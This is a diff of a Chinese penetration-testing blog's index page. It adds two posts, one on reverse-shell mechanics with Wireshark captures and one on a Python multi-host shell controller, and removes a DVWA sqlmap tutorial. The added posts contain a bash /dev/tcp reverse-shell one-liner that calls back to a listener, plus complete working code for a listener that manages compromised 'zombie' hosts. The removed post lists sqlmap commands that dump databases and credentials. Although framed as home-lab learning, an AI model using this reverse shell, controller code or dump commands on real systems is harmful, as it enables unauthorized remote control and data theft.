@@ -155,6 +155,179 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/05/bash-shell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="沫">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="沫的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/03/05/bash-shell/" class="post-title-link" itemprop="url">shell反弹原理</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-03-05 19:56:00 / 修改时间：20:41:15" itemprop="dateCreated datePublished" datetime="2020-03-05T19:56:00+08:00">2020-03-05</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="环境测试"><a href="#环境测试" class="headerlink" title="环境测试"></a>环境测试</h3><pre><code>目标靶机：192.168.0.111  系统kali
+本机：192.168.0.14 系统 mac
+抓包工具：wireshark</code></pre><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>前几天写了一个工具是批量管理shell工具，但是用起来总感觉不是很舒服，于是今天就给他进行了一次改动，emmm，今天这个用起来很舒服，所以就用我这个接收反弹shell的工具来进行实验了，这次主要以抓包为主。</p>
+<h4 id="开启shell接收工具"><a href="#开启shell接收工具" class="headerlink" title="开启shell接收工具"></a>开启shell接收工具</h4><p>我把工具改成了命令行传参，比较像nc把看起来，然后接收到shell直接进入shell，现在已经打开了监听模式<br><img src="/images/pasted-98.png" alt="upload successful"><br>使用靶机用bash把shell传过来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i&gt;&amp; /dev/tcp/192.168.0.14/5555 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>已经成功获取到了shell，然后抓包查看整个过程<br><img src="/images/pasted-99.png" alt="upload successful"></p>
+<h4 id="开始抓包"><a href="#开始抓包" class="headerlink" title="开始抓包"></a>开始抓包</h4><p>wireshark需要对包进行过滤，不然网卡流量很大的，你是无法抓取到准确的包</p>
+<p>这句话的意思是只抓取来源地址是192.168.0.14并且是tcp请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.addr &#x3D;&#x3D; 192.168.0.14 and tcp</span><br></pre></td></tr></table></figure>
+<p>建立tcp请求，syn包发起请求<br><img src="/images/pasted-100.png" alt="upload successful"><br>tcp请求建立结束后，kali主动给服务器发送了一个包，图二</p>
+<p><img src="/images/pasted-101.png" alt="upload successful"></p>
+<p><img src="/images/pasted-102.png" alt="upload successful"><br>我发了一个ls指令</p>
+<p><img src="/images/pasted-103.png" alt="upload successful"></p>
+<p><img src="/images/pasted-104.png" alt="upload successful"></p>
+<p><img src="/images/pasted-105.png" alt="upload successful"></p>
+<p>整个过程抓包简单呈现，如果不懂tcp三次握手建立连接的，先去读tcp，最后的fin关闭包就说了，我执行了exit，触发了fin。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/shell-control/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="沫">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="沫的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/03/04/shell-control/" class="post-title-link" itemprop="url">批量shell控制</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-03-04 17:07:00" itemprop="dateCreated datePublished" datetime="2020-03-04T17:07:00+08:00">2020-03-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-03-20 20:35:50" itemprop="dateModified" datetime="2020-03-20T20:35:50+08:00">2020-03-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="emm最近看了很多木马控制的工具，但是一直想弄懂他是怎么实现的，于是今天就用了半天时间做了这个实验，使用python去进行批量肉鸡控制"><a href="#emm最近看了很多木马控制的工具，但是一直想弄懂他是怎么实现的，于是今天就用了半天时间做了这个实验，使用python去进行批量肉鸡控制" class="headerlink" title="emm最近看了很多木马控制的工具，但是一直想弄懂他是怎么实现的，于是今天就用了半天时间做了这个实验，使用python去进行批量肉鸡控制"></a>emm最近看了很多木马控制的工具，但是一直想弄懂他是怎么实现的，于是今天就用了半天时间做了这个实验，使用python去进行批量肉鸡控制</h3><h4 id="1-实现socket监听"><a href="#1-实现socket监听" class="headerlink" title="1.实现socket监听"></a>1.实现socket监听</h4><p><img src="/images/pasted-90.png" alt="upload successful"></p>
+<p>上面代码基本意思就是端口复用，并且监听一个端口服务，因为木马都是主动发起tcp请求进行连接，为了达到批量的效果，我选择使用了一个列表进行保存，在接收到shell的时候，就把这个shell对象写到一个字典里面，然后通过列表进行保存.</p>
+<h4 id="2-获取监听内容"><a href="#2-获取监听内容" class="headerlink" title="2.获取监听内容"></a>2.获取监听内容</h4><p><img src="/images/pasted-91.png" alt="upload successful"><br>这个步骤就是看回显了，我本来尝试用utf-8进行解码，然后一直报错，百度了一下可以使用gb2312和gbk对windows解码。</p>
+<h4 id="3-发送指令执行"><a href="#3-发送指令执行" class="headerlink" title="3.发送指令执行"></a>3.发送指令执行</h4><p><img src="/images/pasted-93.png" alt="upload successful"><br>emm其实只要满足这三点就可以进行shell操作了，外加上一个循环，不过因为我需要做的是批量shell控制所以就还得多加一点代码，在执行语句的时候一定要加上这些换行符，不然是不生效的代码。</p>
+<h4 id="4-批量编写"><a href="#4-批量编写" class="headerlink" title="4.批量编写"></a>4.批量编写</h4><p><img src="/images/pasted-94.png" alt="upload successful"><br>emmm 看前三个其实并没啥用，cmd继承类server这个类，是因为我需要用到一些server类的一些方法。</p>
+<p><img src="/images/pasted-95.png" alt="upload successful"><br>这个对象是获取socket对象的，只要列表里面存在这个ip地址那么就返回该socket的对象，这样就可以进行命令执行了</p>
+<h4 id="5-执行命令"><a href="#5-执行命令" class="headerlink" title="5.执行命令"></a>5.执行命令</h4><p><img src="/images/pasted-96.png" alt="upload successful"><br>有了这些对象，开启了消息监听就是我们最开始那个阻塞recv获取消息的函数，发送命令也是前面的。。。</p>
+<h4 id="6-整体演示"><a href="#6-整体演示" class="headerlink" title="6.整体演示"></a>6.整体演示</h4><p><img src="/images/pasted-97.png" alt="upload successful"><br>先是代码阻塞等待连接，然后 选择ip地址，因为就是我在保存ip地址的时候吧监听的写进去了，所以出现了错误emmm，大意了。</p>
+<h4 id="整体代码"><a href="#整体代码" class="headerlink" title="整体代码"></a>整体代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于shell监听</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Server</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.ip = <span class="string">'192.168.0.14'</span></span><br><span class="line">        self.port = <span class="number">5555</span></span><br><span class="line">        self.shell_arr = []  <span class="comment"># 用于保存多个shell</span></span><br><span class="line">        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="literal">True</span>)</span><br><span class="line">        self.server.bind((self.ip, self.port))</span><br><span class="line">        self.server.listen(<span class="number">10</span>)</span><br><span class="line">        threading.Thread(target=self.get_shell).start()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_shell</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""监听shell"""</span></span><br><span class="line">        print(<span class="string">'** listening--listen &#123;&#125;:&#123;&#125;'</span>.format(self.ip, self.port))</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client_socket, addr = self.server.accept()</span><br><span class="line">            <span class="comment"># 吧对象写入到字典</span></span><br><span class="line">            print(<span class="string">'\n已接收到shell'</span>)</span><br><span class="line">            self.shell_arr.append(&#123;<span class="string">'ip'</span>: self.ip, <span class="string">'shell_obj'</span>: client_socket&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">msg</span><span class="params">(self, sock)</span>:</span></span><br><span class="line">        <span class="comment"># 显示消息接收</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                user_msg = sock.recv(<span class="number">2048</span>).decode(<span class="string">'gb2312'</span>)</span><br><span class="line">                print(user_msg)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> Error:</span><br><span class="line">            sock.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_msg</span><span class="params">(self, sock, msg)</span>:</span></span><br><span class="line">        <span class="comment"># 发送指令</span></span><br><span class="line">        msg = <span class="string">'\r\n'</span> + msg + <span class="string">'\r\n\r\n'</span></span><br><span class="line">        sock.send(msg.encode(<span class="string">'gb2312'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cmd</span><span class="params">(Server, threading.Thread)</span>:</span></span><br><span class="line">    <span class="comment"># 命令基础概念，多个肉鸡控制</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                cmd = str(input(<span class="string">'mo:'</span>))</span><br><span class="line">                <span class="keyword">if</span> cmd == <span class="string">'help'</span>:</span><br><span class="line">                    self.help()  <span class="comment"># 帮助菜单</span></span><br><span class="line">                <span class="keyword">elif</span> cmd == <span class="string">'show'</span>:</span><br><span class="line">                    self.show()  <span class="comment"># 显示肉鸡</span></span><br><span class="line">                <span class="keyword">elif</span> <span class="string">'option host='</span> <span class="keyword">in</span> cmd:</span><br><span class="line">                    self.send_cmd(self.ip_processing(cmd))  <span class="comment"># 获取socket对象</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> Error:</span><br><span class="line">            print(Error)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">help</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'show命令可以查看肉鸡列表\n'</span></span><br><span class="line">              <span class="string">'option host=可以选中肉鸡'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'可以选择输入 option host=主机地址进行shell控制'</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> self.shell_arr:</span><br><span class="line">            print(i[<span class="string">'ip'</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ip_processing</span><span class="params">(self, ip_str)</span>:</span></span><br><span class="line">        <span class="string">"""分割ip地址"""</span></span><br><span class="line">        left_index = ip_str.find(<span class="string">'='</span>)</span><br><span class="line">        <span class="comment"># 寻找该ip地址的shell信息</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> self.shell_arr:</span><br><span class="line">                <span class="keyword">if</span> i[<span class="string">'ip'</span>] == ip_str[left_index + <span class="number">1</span>:]:</span><br><span class="line">                    <span class="keyword">return</span> i[<span class="string">'shell_obj'</span>]</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> Error:</span><br><span class="line">            print(Error)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_cmd</span><span class="params">(self, sock)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> sock:</span><br><span class="line">            print(<span class="string">'对不起该ip地址不存在'</span>)</span><br><span class="line">            self.run()</span><br><span class="line">        <span class="comment"># 开启消息监听，因为里面是死循环消息监听，所以需要使用多线程</span></span><br><span class="line">        threading.Thread(target=self.msg, args=(sock,)).start()</span><br><span class="line">        <span class="comment"># 开启命令执行</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            command = input(<span class="string">''</span>)</span><br><span class="line">            self.send_msg(sock, command)</span><br><span class="line">            <span class="keyword">if</span> command == <span class="string">'exit'</span>:</span><br><span class="line">                self.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    server = Cmd()</span><br><span class="line">    server.run()</span><br></pre></td></tr></table></figure>
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>其实自己去实现一次shell获取是很有必要的，可以了解到木马连接服务器的实现</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/22/qrcode/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -906,259 +1079,6 @@ sign参数和token参数，from参数和to参数可以选择固定也可以选�
   
   
 
-        
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/09/DVWA-sqlmap/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="沫">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="沫的博客">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/02/09/DVWA-sqlmap/" class="post-title-link" itemprop="url">DVWA--sql注入（sqlmap工具使用）</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-02-09 19:17:00" itemprop="dateCreated datePublished" datetime="2020-02-09T19:17:00+08:00">2020-02-09</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-02-13 13:37:53" itemprop="dateModified" datetime="2020-02-13T13:37:53+08:00">2020-02-13</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="DVWA-low级注入-工具注入-sqlmap"><a href="#DVWA-low级注入-工具注入-sqlmap" class="headerlink" title="DVWA low级注入 工具注入 sqlmap"></a>DVWA low级注入 工具注入 sqlmap</h3><p>注入点：<a href="http://119.29.172.123:888/vulnerabilities/sqli/?id=4&amp;Submit=Submit" target="_blank" rel="noopener">http://119.29.172.123:888/vulnerabilities/sqli/?id=4&amp;Submit=Submit</a><br>渗透过程中因为靶机需要进行登陆，所以需要cookie</p>
-<h6 id="渗透攻击环境windows–sqlmap注意事项"><a href="#渗透攻击环境windows–sqlmap注意事项" class="headerlink" title="渗透攻击环境windows–sqlmap注意事项"></a>渗透攻击环境windows–sqlmap注意事项</h6><p>1.sqlmap必须运行在python2环境上<br>2.sqlmap地址传入的时候需要加入双引号，不能使用单引号，不然会报错</p>
-<h6 id="攻击开始"><a href="#攻击开始" class="headerlink" title="攻击开始"></a>攻击开始</h6><p>例：pyload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.0.248:18888&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1%27&amp;Submit&#x3D;Submit#&quot; --cookie&#x3D;&quot;security&#x3D;low; PHPSESSID&#x3D;s7chh60kea3l6q63ql5crousrc&quot; -p &quot;id&quot; -v 7</span><br></pre></td></tr></table></figure>
-
-<p><span style="color:blue;"> 填充参数发起攻击 </span></p>
-<pre><code>-u &quot;注入的地址&quot;
--p 指定注入点
--v 显示执行回显，最高回显为7
---cookie 传入登陆信息</code></pre><p><img src="/images/pasted-11.png" alt="upload successful"></p>
-<p>他会问你是否注入id，因为我已经手注过，所以知道注入点是id，就只注入id，如果不选择y，那么就会全部注入 第二个是问你他看起来像是mysql后端，选择yes是就行了</p>
-<p><img src="/images/pasted-12.png" alt="upload successful"></p>
-<p>注入后得到这个参数是脆弱的，是否测试其余参数，默认是不测试</p>
-<p><img src="/images/pasted-13.png" alt="upload successful"></p>
-<p>注入后的返回结果，sqlmap默认执行了4种注入方法</p>
-<p><span style="color:red;"> 1.布尔注入</span></p>
-<p>布尔注入，返回true和false,也可以称为逻辑注入<br><img src="/images/pasted-14.png" alt="upload successful"></p>
-<p><span style="color:red;"> 2.报错注入</span></p>
-<p>执行sql语句时候，会进行报错</p>
-<p><img src="/images/pasted-15.png" alt="upload successful"></p>
-<p><span style="color:red;"> 3.时间注入 time</span></p>
-<p>有部分的mysql执行他是没有数据返回的，如果需要判断一个sql注入可以用他内置函数延时来判断他是否存在sql注入</p>
-<p><img src="/images/pasted-16.png" alt="upload successful"></p>
-<p><span style="color:red;"> 4.联合查询</span></p>
-<p>这种注入方式比较主流，可以配合order去猜表各种。<br><img src="/images/pasted-17.png" alt="upload successful"></p>
-<h6 id="获取数据库"><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h6><p>例：pyload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.0.248:18888&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1%27&amp;Submit&#x3D;Submit#&quot; --cookie&#x3D;&quot;security&#x3D;low; PHPSESSID&#x3D;s7chh60kea3l6q63ql5crousrc&quot; -p &quot;id&quot; -v 3 --current-db</span><br></pre></td></tr></table></figure>
-
-<p><span style="color:blue;">可以看到获取到的表是dvwa</span></p>
-<p><img src="/images/pasted-18.png" alt="upload successful"></p>
-<h6 id="获取数据库中的所有表"><a href="#获取数据库中的所有表" class="headerlink" title="获取数据库中的所有表"></a>获取数据库中的所有表</h6><p>例：pyload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.0.248:18888&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1%27&amp;Submit&#x3D;Submit#&quot; --cookie&#x3D;&quot;security&#x3D;low; PHPSESSID&#x3D;s7chh60kea3l6q63ql5crousrc&quot; -p &quot;id&quot; -v 3 --tables -D &quot;dvwa&quot;</span><br></pre></td></tr></table></figure>
-<p><span style="color:blue;">–tables 获取表-D （D代表当前数据库database）</span></p>
-<p><img src="/images/pasted-19.png" alt="upload successful"></p>
-<h6 id="拆解表的字段"><a href="#拆解表的字段" class="headerlink" title="拆解表的字段"></a>拆解表的字段</h6><p>例：pyload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.0.248:18888&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1%27&amp;Submit&#x3D;Submit#&quot; --cookie&#x3D;&quot;security&#x3D;low; PHPSESSID&#x3D;s7chh60kea3l6q63ql5crousrc&quot; -p &quot;id&quot; -v 3 --columns -T &quot;users&quot; -D &quot;dvwa&quot;</span><br></pre></td></tr></table></figure>
-
-<p><span style="color:blue;">–columns （拆解字段）-T (T代表的是tables) users是需要拆解的表名</span></p>
-<p><img src="/images/pasted-20.png" alt="upload successful"></p>
-<h6 id="获取字段里的数据"><a href="#获取字段里的数据" class="headerlink" title="获取字段里的数据"></a>获取字段里的数据</h6><p>例：pyload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.0.248:18888&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1%27&amp;Submit&#x3D;Submit#&quot; --cookie&#x3D;&quot;security&#x3D;low; PHPSESSID&#x3D;s7chh60kea3l6q63ql5crousrc&quot; -p &quot;id&quot; --dump  -C&quot;user,password&quot; -T &quot;users&quot; -D &quot;dvwa&quot;</span><br></pre></td></tr></table></figure>
-<p><span style="color:blue;">–dump 把信息存储下来  -C (代表需要获取数据的字段)</span></p>
-<p><img src="/images/pasted-21.png" alt="upload successful"></p>
-<p><span style="color:blue;">sqlmap自带md5字典破解（选择默认值，就可以自动进行破解</span></p>
-<p><img src="/images/pasted-22.png" alt="upload successful"></p>
-<h6 id="获取其他数据库"><a href="#获取其他数据库" class="headerlink" title="获取其他数据库"></a>获取其他数据库</h6><p>例：pyload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.0.248:18888&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1%27&amp;Submit&#x3D;Submit#&quot; --cookie&#x3D;&quot;security&#x3D;low; PHPSESSID&#x3D;s7chh60kea3l6q63ql5crousrc&quot; -p &quot;id&quot; --dbs</span><br></pre></td></tr></table></figure>
-<p><span style="color:blue;">下图就是获取的数据库,剩余获取数据，拆表字段和上面一样</span><br><img src="/images/pasted-23.png" alt="upload successful"></p>
-<h6 id="root权限脱裤"><a href="#root权限脱裤" class="headerlink" title="root权限脱裤"></a>root权限脱裤</h6><p>例：pyload<br><span style="color:blue;">嘿嘿执行这个命令你就可以看见黑客超炫酷的画面了哦</span></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.0.248:18888&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1%27&amp;Submit&#x3D;Submit#&quot; --cookie&#x3D;&quot;security&#x3D;low; PHPSESSID&#x3D;s7chh60kea3l6q63ql5crousrc&quot; -p &quot;id&quot; --dump-all</span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/08/sql_injection/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="沫">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="沫的博客">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/02/08/sql_injection/" class="post-title-link" itemprop="url">DVWA-sql注入手注（low）</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-02-08 15:01:00" itemprop="dateCreated datePublished" datetime="2020-02-08T15:01:00+08:00">2020-02-08</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-02-12 13:42:51" itemprop="dateModified" datetime="2020-02-12T13:42:51+08:00">2020-02-12</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-            </span>
-
-          
